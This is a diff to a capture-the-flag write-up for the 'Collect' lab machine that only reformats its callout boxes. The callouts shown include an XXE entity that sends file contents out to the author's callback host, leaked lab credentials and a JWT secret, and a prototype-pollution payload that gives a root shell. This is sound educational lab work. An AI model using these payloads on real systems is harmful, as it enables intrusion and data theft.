@@ -127,11 +127,9 @@ Seems like a site for employees however it was publicly accessible. You can also
 
 ![](https://i.imgur.com/MwnyJ9O.png)
 
-<aside>
-❗ Important
-token=ddac62a28254561001277727cb397baf
-
-</aside>
+> 📘 Info
+>
+> token=ddac62a28254561001277727cb397baf
 
 This was located inside the attached log file. The token can be used to create admin users at [`http://collect.htb/set/role/admin`](http://collect.htb/set/role/admin). All it needs to take is the PHPSESSID cookie so I can send in a POST request with my account’s cookie in order to turn it into an admin account.
 
@@ -158,19 +156,17 @@ API POST Request example
 
 Interestingly enough, seems like the API takes in requests in the format of XML.
 
-<aside>
-❕ **Information**
-The output is in XML which is commonly vulnerable to XXE
 
-</aside>
+> 📘 Info
+> 
+> The output is in XML which is commonly vulnerable to XXE
 
 ## XXE → SSRF Out of Bands Exfiltration
 
-<aside>
-⚠️ **First off, what is XXE?**
-XML External Entity or XXE for short is a type of vulnerability that occurs when an XML parser processes input containing a reference to an external entity hence the name. Generally speaking, XXE is used to disclose local files or at least, that is the extent to which I have been able to use it for in the past.
 
-</aside>
+> ⚠️ First off, what is XXE?
+>
+> XML External Entity or XXE for short is a type of vulnerability that occurs when an XML parser processes input containing a reference to an external entity hence the name. Generally speaking, XXE is used to disclose local files or at least, that is the extent to which I have been able to use it for in the past.
 
 While attempting basic XXE payloads from Hacktricks such as:
 
@@ -227,12 +223,10 @@ Upon sending the request, it works! It is indeed vulnerable to XXE! The next iss
 
 Bingo we get a hit! All we need to do is base64 decode this data and we get the contents of `index.php`.
 
-<aside>
-❓ **Wait wait wait, what’s going on?**
-Let me try to explain what happened here. I sent in a valid post request utilizing an actual API request from earlier but appended the external entity into it. This is in the line: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.14.137/evil.dtd"> %xxe;]>`
-This calls back to my webserver and loads in a file, `index.php` and sends it to my webserver again through the URL. So that base64 output you are seeing, that’s the `index.php` page encoded and sent straight back to me.
-
-</aside>
+> ❗️ Wait wait wait, what’s going on?
+>
+> Let me try to explain what happened here. I sent in a valid post request utilizing an actual API request from earlier but appended the external entity into it. This is in the line: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.14.137/evil.dtd"> %xxe;]>`
+> This calls back to my webserver and loads in a file, `index.php` and sends it to my webserver again through the URL. So that base64 output you are seeing, that’s the `index.php` page encoded and sent straight back to me.
 
 ### Interesting Files
 
@@ -273,12 +267,10 @@ require '../vendor/autoload.php';
 
 Would you look at that, credentials for the Redis database from earlier. There is also an `autoload.php` however, upon looking into it, there is nothing interesting there.
 
-<aside>
-❕ **Information**
-1002:victor
-collect.htb	developers.collect.htb	forum.collect.htb
-
-</aside>
+> 📘 Info
+>
+> 1002:victor
+> collect.htb	developers.collect.htb	forum.collect.htb
 
 This information comes from `/etc/group` and `/etc/hosts` respectively. Most importantly, we have a potential user of interest in Victor. Oddly enough, I didn’t see any users with id 1000 or 1001.
 
@@ -302,13 +294,12 @@ This payload worked and we have the contents of the `.htpasswd` file. The userna
     `john hash --wordlist=/usr/share/wordlists/rockyou.txt`
     
 
-<aside>
-❕ **Information**
-developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1
-→
-developers_group:r0cket
 
-</aside>
+
+> 📘 Info
+>
+> developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1
+> developers_group:r0cket
 
 With the developers site password and the Redis database password, we should have enough information from XXE to move on.
 
@@ -321,16 +312,11 @@ New site new login page, again. Reusing any of the creds earlier fails here. I l
 Since I can’t get any authentication going, best I can do is retrieve some files.
     
 
-<aside>
-❕ **Information**
-——————————————————————————
-if (!isset($_SESSION['auth']) or $_SESSION['auth'] != True) {
-    die(header('Location: /login.php'));
-}
-——————————————————————————
-This section in the `index.php` sticks out to me. We’ll revisit this later.
+> 📘 Info
+>
+> if (!isset($_SESSION['auth']) or $_SESSION['auth'] != True)
+> This section in the `index.php` sticks out to me. We’ll revisit this later.
 
-</aside>
 
 ## Redis Database
 
@@ -360,17 +346,13 @@ Credentials are valid and here we were able to spill some information. Those 2 k
 
 As we can see, these are the key contents of the associated `PHPSESSID` values. If anyone isn’t familiar with this layout, this is just a serialized PHP string.
 
-<aside>
-❓ **What’s a PHPSESSID and why is this important?**
-A `PHPSESSID` is a cookie commonly given out most if not all PHP sites. These are session identifiers that correspond with a actual data on the back end that stores information such as your username or even an email associated with your account. Note that this value is just an identifier— an arbitrary value. In this Redis database however, we are able to see the values of the cookie and even manipulate meaning we can create our own cookie with its own set values.
+> ❗️ What’s a PHPSESSID and why is this important?
+>
+> A `PHPSESSID` is a cookie commonly given out most if not all PHP sites. These are session identifiers that correspond with a actual data on the back end that stores information such as your username or even an email associated with your account. Note that this value is just an identifier— an arbitrary value. In this Redis database however, we are able to see the values of the cookie and even manipulate meaning we can create our own cookie with its own set values.
 
-</aside>
-
-<aside>
-⚠️ **How can we abuse this?**
-Well, if we can sign cookies with any value, it would be possible to spin up a “session” for an account that doesn’t exist and possibly even bypass authentication such as the one seen on the `/login.php` of the developers site.
-
-</aside>
+> ⚠️ How can we abuse this?
+>
+> Well, if we can sign cookies with any value, it would be possible to spin up a “session” for an account that doesn’t exist and possibly even bypass authentication such as the one seen on the `/login.php` of the developers site.
 
 ## Revisiting Developers Subdomain
 
@@ -394,10 +376,10 @@ Looks like we are in! Every page here seems to be static but there is one key th
 
 URL of the site
 
-<aside>
-❕ **Information**
-Possible LFI on a PHP site! LFI → PHP RCE Chain is a valid candidate to test.
-</aside>
+
+> 📘 Info
+>
+> Possible LFI on a PHP site! LFI → PHP RCE Chain is a valid candidate to test.
 
 Initial tests with standard LFI payloads is not displaying anything but since this is a PHP site, I jumped the gun and went straight for the chain. There is a nice [tool](https://github.com/synacktiv/php_filter_chain_generator) that can generate chains for us and this was the the command I used:
 
@@ -457,12 +439,10 @@ $db = new mysqli("localhost", "webapp_user", "Str0ngP4ssw0rdB*12@1", "developers
 $db->set_charset('utf8mb4');
 ```
 
-<aside>
-❕ **Information**
-We have plaintext credentials!!
-webapp_user:Str0ngP4ssw0rdB*12@1
-
-</aside>
+> 📘 Info
+> 
+> We have plaintext credentials!!
+> webapp_user:Str0ngP4ssw0rdB*12@1
 
 Credentials obtained and noted. Next up is where to use them.
 
@@ -748,12 +728,11 @@ Although the process is run as root, it’s Victor, our current user, who is the
 
 Alright that’s a lot of files listed, but let me save you from the pain I suffered from staring between these JavaScript files for a couple hours.
 
-<aside>
-❕ **Information**
-We have a JWT secret!!
-const SECRET = "JWT_COLLECT_124_SECRET_KEY"
 
-</aside>
+> 📘 Info
+>
+> We have a JWT secret!!
+> const SECRET = "JWT_COLLECT_124_SECRET_KEY"
 
 This will allow us to sign ourselves a cookie if necessary.
 
@@ -776,17 +755,15 @@ const { exec } = require('child_process');
 		exec('/home/victor/pollution_api/log.sh log_message');
 ```
 
-<aside>
-❓ **What so important about this excerpt?**
-After luckily landing on XCT’s video regarding Unobtanium, he mentioned that there is a specific vulnerability in JavaScript regarding the _.merge function.
+> ❗️ What so important about this excerpt?
+>
+> After luckily landing on XCT’s video regarding Unobtanium, he mentioned that there is a specific vulnerability in JavaScript regarding the _.merge function.
 
-</aside>
 
-<aside>
-⚠️ **How can we abuse all of this?**
-Well, our attack chain is going to be quite an interesting one but here is the attack plan all laid out. First we need to go into MariaDB and create a user with admin privileges. The db user is in charge of the web application in general so we should have write access. After creating our user, we need to login so that we can obtain a JWT for authentication. Pass in the JWT to allow us to make requests to the `/admin/messages/send` endpoint. Reason being that this is vulnerable to prototype pollution. Since this is run as root, we most likely will be gaining a root shell if all this is done properly.
 
-</aside>
+> ⚠️ How can we abuse all of this?
+>
+> Well, our attack chain is going to be quite an interesting one but here is the attack plan all laid out. First we need to go into MariaDB and create a user with admin privileges. The db user is in charge of the web application in general so we should have write access. After creating our user, we need to login so that we can obtain a JWT for authentication. Pass in the JWT to allow us to make requests to the `/admin/messages/send` endpoint. Reason being that this is vulnerable to prototype pollution. Since this is run as root, we most likely will be gaining a root shell if all this is done properly.
 
 ## Requesting Authentication
 
@@ -820,11 +797,10 @@ Now we have a JWT we can pass in. It’s only valid for 1 hour so we shouldn’t
 
 With our JWT, we can begin making requests to the `/admin` endpoint that was not accessible earlier. (Although I didn’t show that it was inaccessible without the cookie, you’re just going to have to take my word for it). As mentioned earlier, those few lines in the `Send_messages.js` are vulnerable to prototype pollution.
 
-<aside>
-❓ **What is prototype pollution?**
-Prototype pollution is a vulnerability that exists within JavaScript when there is a function that merges data that the user can control. The by injecting into an object’s prototype, we can assign malicious values into all instances of the inherited object. Like all other user input-controlled vulnerabilities, this can be mitigated through input sanitization. For a more detailed description please give the [PortSwigger](https://portswigger.net/web-security/prototype-pollution) article a read.
 
-</aside>
+> ❗️ What is prototype pollution? 
+>
+> Prototype pollution is a vulnerability that exists within JavaScript when there is a function that merges data that the user can control. The by injecting into an object’s prototype, we can assign malicious values into all instances of the inherited object. Like all other user input-controlled vulnerabilities, this can be mitigated through input sanitization. For a more detailed description please give the [PortSwigger](https://portswigger.net/web-security/prototype-pollution) article a read.
 
 [What is prototype pollution? | Web Security Academy](https://portswigger.net/web-security/prototype-pollution)
 
@@ -847,12 +823,8 @@ Prototype pollution is a vulnerability that exists within JavaScript when there 
 
 Back to the vulnerable code, if we send in something like `{"text": '{"__proto__": {"shell": "/path/to/executable"}}'}` , we can get RCE.
 
-<aside>
-⚠️ **Explanation**
-Here, the **`__proto__`** property is set to an object that has a **`shell`** property with a value of the executable path. By doing this, the attacker has modified the prototype of the merged object, allowing them to add arbitrary properties or methods to the object.
-
-Later in the code, the **`exec()`** function is called with a shell command that uses the **`log.sh`** script to log a message. Since the attacker has modified the prototype of the merged object, the **`exec()`** function will search for the **`shell`** property in the object's prototype chain and find it there. This will cause the shell command to execute the attacker's specified executable path, which is a security vulnerability.
-
-</aside>
+> ⚠️ Explanation
+> Here, the **`__proto__`** property is set to an object that has a **`shell`** property with a value of the executable path. By doing this, the attacker has modified the prototype of the merged object, allowing them to add arbitrary properties or methods to the object.
+> Later in the code, the **`exec()`** function is called with a shell command that uses the **`log.sh`** script to log a message. Since the attacker has modified the prototype of the merged object, the **`exec()`** function will search for the **`shell`** property in the object's prototype chain and find it there. This will cause the shell command to execute the attacker's specified executable path, which is a security vulnerability.
 
 That being said, I can just reuse my payload I dropped earlier to gain shell as root since we know this API is being executed as root.
